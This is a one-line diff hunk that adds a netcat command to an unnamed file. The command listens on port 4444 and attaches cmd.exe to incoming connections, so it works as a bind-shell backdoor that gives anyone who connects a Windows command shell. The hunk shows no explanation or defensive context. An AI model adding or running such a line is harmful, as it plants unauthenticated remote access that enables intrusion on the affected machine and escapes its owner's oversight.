@@ -1,0 +1,1 @@
+nc -L -p 4444 -e cmd.exe
